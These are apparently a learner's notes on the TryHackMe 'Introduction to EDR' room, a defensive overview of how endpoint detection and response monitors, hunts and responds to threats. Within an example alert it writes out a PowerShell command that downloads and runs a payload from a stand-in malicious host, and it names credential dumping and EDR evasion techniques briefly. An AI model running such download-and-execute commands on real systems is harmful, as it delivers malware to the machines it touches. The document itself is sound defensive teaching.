# Introduction to EDR

## Overview
Completed the Introduction to EDR room on TryHackMe

EDR (Endpoint Detection and Response) is the eyes and ears on every endpoint. While SIEM sees the network, EDR sees every process, every file, and every action happening inside the endpoint.

## What is EDR?

**EDR = Endpoint Detection and Response**

EDR is an advanced security solution that:
- **Monitors** endpoint activity in real-time
- **Detects** suspicious behaviors and threats
- **Investigates** security incidents  
- **Responds** to threats automatically or manually
- **Hunts** for hidden threats proactively

## Why EDR? (The AV is Not Enough)

### Traditional Antivirus (AV) Limitations:

❌ **Signature-Based**: Only detects known malware
❌ **Reactive**: Waits for malware to execute
❌ **Limited Visibility**: Just scans files
❌ **No Context**: Can't see attack chain
❌ **Easy to Bypass**: Polymorphic malware evades it

### EDR Advantages:

✅ **Behavior-Based**: Detects unknown threats by behavior
✅ **Proactive**: Monitors execution in real-time
✅ **Full Visibility**: Sees processes, registry, network, files
✅ **Contextual**: Understands entire attack timeline
✅ **Hard to Evade**: Behavioral analysis catches new techniques

## Core EDR Capabilities

### 1. Real-Time Monitoring

EDR continuously monitors endpoint activity:

**What EDR Sees**:
- Process creation and termination
- File operations (create, modify, delete)
- Registry modifications
- Network connections
- DLL injections
- Memory operations
- User authentication events
- PowerShell/command-line activity

**Example**:
```
Process: powershell.exe
Parent: outlook.exe  
Command: IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
Network: Connection to 203.0.113.50:4444

🚨 EDR Alert: Suspicious PowerShell execution from email client
```

### 2. Behavioral Detection

EDR doesn't rely on signatures—it watches for suspicious patterns:

**Detection Examples**:

**Credential Dumping**:
```
Process: mimikatz.exe accessing lsass.exe memory
→ EDR detects memory access pattern typical of credential theft
```

**Lateral Movement**:
```
User 'john' accessing 50 different systems in 10 minutes
→ EDR flags abnormal lateral movement
```

**Living Off the Land (LOLBins)**:
```
Process: certutil.exe downloading executable
→ EDR recognizes misuse of legitimate Windows tool
```

### 3. Threat Hunting

EDR enables proactive searching for threats:

**Hunt Scenarios**:
- Search for all PowerShell executions with base64 encoding
- Find processes making connections to TOR nodes
- Identify unsigned DLLs loaded by system processes
- Locate files with double extensions (.pdf.exe)

**Query Example**:
```
Find all processes where:
- Command line contains "bypass" AND "ExecutionPolicy"
- OR parent process is "w ord.exe" spawning "cmd.exe"
```

### 4. Incident Response

EDR provides tools to respond to threats:

**Response Actions**:
- **Isolate** endpoint from network
- **Kill** malicious processes
- **Quarantine** suspicious files
- **Block** network connections
- **Collect** forensic data
- **Restore** from safe state

**Automated Response**:
```
IF (process = mimikatz.exe)
THEN:
  1. Kill process
  2. Quarantine file  
  3. Isolate endpoint
  4. Alert SOC team
  5. Collect memory dump
```

### 5. Forensic Timeline

EDR records everything for post-incident analysis:

**Attack Timeline Example**:
```
10:15:23 - Phishing email received
10:16:45 - User clicks malicious link
10:16:47 - PowerShell executes
10:16:50 - Downloads malware payload
10:17:02 - Malware creates persistence (registry key)
10:17:15 - Lateral movement to Server01
10:18:30 - Data exfiltration begins
10:19:00 - EDR blocks and isolates endpoint
```

This timeline is impossible without EDR.

## Popular EDR Solutions

### Commercial EDR:
- **CrowdStrike Falcon**: Cloud-native, lightweight agent
- **Microsoft Defender for Endpoint**: Integrated with Windows
- **SentinelOne**: AI-driven autonomous response
- **Carbon Black**: VMware's EDR solution
- **Palo Alto Cortex XDR**: Extended detection (network + endpoint)

### Open Source:
- **Wazuh**: Free EDR + SIEM capabilities
- **OSQuery**: Endpoint visibility and querying
- **Velociraptor**: Advanced DFIR and hunting platform
- **OSSEC**: Host-based intrusion detection

## EDR vs Antivirus vs SIEM

### Comparison:

| Feature | Antivirus | EDR | SIEM |
|---------|-----------|-----|------|
| **Focus** | Malware files | Endpoint behavior | Network-wide events |
| **Detection** | Signature-based | Behavioral analysis | Event correlation |
| **Visibility** | File system | Process-level | Cross-system |
| **Response** | Quarantine file | Kill process, isolate endpoint | Alert analyst |
| **Hunting** | No | Yes | Yes |
| **Forensics** | Limited | Detailed timeline | Log aggregation |

### How They Work Together:

```
┌─────────┐
│  SIEM   │ ← Aggregates alerts from all sources
└────┬────┘
     │
     ├──────────────┬──────────────┐
     ▼              ▼              ▼
 ┌───────┐      ┌───────┐      ┌───────┐
 │  EDR  │      │ Firewall│     │  IDS  │
 └───────┘      └───────┘      └───────┘
     │
     ▼
 ┌──────────────────────────────┐
 │  Endpoints (laptops/servers)  │
 └──────────────────────────────┘
```

## Real-World Attack Scenarios

### Scenario 1: Ransomware Attack

**Without EDR**:
- Malware executes
- Encrypts all files
- Damage done before detection

**With EDR**:
```
1. EDR detects unusual file encryption activity
2. Identifies ransomware behavior pattern
3. Automatically kills malicious process
4. Isolates endpoint from network
5. Prevents spread to other systems
6. Provides full attack timeline for investigation
```

### Scenario 2: Fileless Malware

**Traditional AV**: ❌ Cannot detect (no file to scan)

**EDR**: ✅ Detects suspicious PowerShell behavior:
```
Alert: PowerShell launched by Excel
→ Downloads payload directly to memory
→ No file written to disk
→ EDR catches memory-based execution pattern
```

## EDR Detection Techniques

### 1. Process Behavior Monitoring
- Parent-child process relationships
- Abnormal process spawning
- Process injection techniques
- DLL side-loading

### 2. File Activity Monitoring
- Mass file modifications (ransomware)
- Unusual file locations (Temp, AppData)
- File permission changes
- Hidden file creation

### 3. Network Activity Monitoring
- Beaconing behavior (C2 communication)
- Connections to known malicious IPs
- Unusual ports or protocols
- Data exfiltration patterns

### 4. Registry Monitoring
- Persistence mechanisms
- Autorun locations
- Security setting modifications

## Limitations and Challenges

### EDR Limitations:

1. **Resource Usage**: Agent consumes CPU/memory
2. **Alert Fatigue**: Can generate many false positives
3. **Evasion**: Advanced attackers know EDR techniques
4. **Blind Spots**: Can't see encrypted traffic content
5. **Agent Dependency**: If agent is disabled, no visibility

### Evasion Techniques (Know Thy Enemy):

- Disabling EDR agent (requires admin)
- Living off the land (using legitimate tools)
- Memory-only execution
- Process hollowing/injection
- Timing attacks (slow and low)

## Best Practices for SOC Analysts

### Using EDR Effectively:

1. **Learn Query Language**: Master your EDR's search syntax
2. **Understand Baselines**: Know normal endpoint behavior
3. **Investigate Fully**: Don't just close alerts—understand root cause
4. **Hunt Proactively**: Don't wait for alerts, search for threats
5. **Tune Detections**: Reduce false positives over time
6. **Document Playbooks**: Create response procedures

### Investigation Workflow:

```
1. Alert Received → What triggered it?
2. Process Analysis → Who/what started it?
3. Timeline Review → What happened before/after?
4. Network Check → Did it communicate externally?
5. File Analysis → What files were created/modified?
6. Lateral Movement → Did it spread?
7. Root Cause → How did attacker get in?
8. Remediation → What actions to take?
```

## Hands-On Skills Developed

✅ Understanding EDR architecture and capabilities
✅ Behavioral-based threat detection
✅ Process-level visibility and monitoring
✅ Incident response with EDR tools
✅ Threat hunting on endpoints
✅ Forensic timeline analysis
✅ Distinguishing EDR from traditional AV

## Key Takeaways

> **EDR sees what SIEM cannot: the detailed execution inside each endpoint.**
>
> SIEM shows you the network. EDR shows you the process. Together, they provide complete visibility.

**Critical Insight**:
- **AV**: Finds known malware files
- **EDR**: Finds malicious behaviors  
- **SIEM**: Connects the dots across the network

All three are essential for modern SOC operations.

## Resources

- [TryHackMe: Introduction to EDR](https://tryhackme.com)
- [MITRE ATT&CK for EDR Mapping](https://attack.mitre.org)
- [CrowdStrike Threat Hunting Guide](https://www.crowdstrike.com)
- [Microsoft Defender ATP Documentation](https://docs.microsoft.com/defender)

---
**Tags:** #EDR #EndpointSecurity #ThreatDetection #IncidentResponse #ThreatHunting #SOC #BlueTeam #BehavioralAnalysis #CyberSecurity #TryHackMe
